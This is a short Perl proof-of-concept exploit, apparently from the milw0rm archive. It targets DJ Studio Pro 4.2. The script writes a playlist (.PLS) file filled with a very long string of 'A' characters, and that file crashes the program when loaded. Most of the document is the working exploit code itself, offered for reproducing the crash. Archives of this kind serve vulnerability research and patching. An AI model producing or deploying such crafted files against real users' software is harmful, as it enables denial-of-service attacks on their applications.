#!/usr/bin/perl -w
#
# DJ Studio Pro 4.2 (.PLS file) Crash Vulnerability Exploit
#
# Founded and exploited by prodigy
#
# Contact: smack_the_stream@hotmail.com
# 
# Vendor: http://www.e-soft.co.uk/
#
# Usage to reproduce the bug: when you created the malicious file, load the file and boooom!
#
# Platform: Windows
#
###################################################################

==PoC==

use strict;

use diagnostics;

my $file= "crash.pls";

my $boom= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;

open($FILE,">>$file");

print $FILE "$boom";

close($FILE);

print "File Created successfully\n";

==EndPoC==


##Greetz: Greetz myself for find the bug.

# milw0rm.com [2009-09-15]
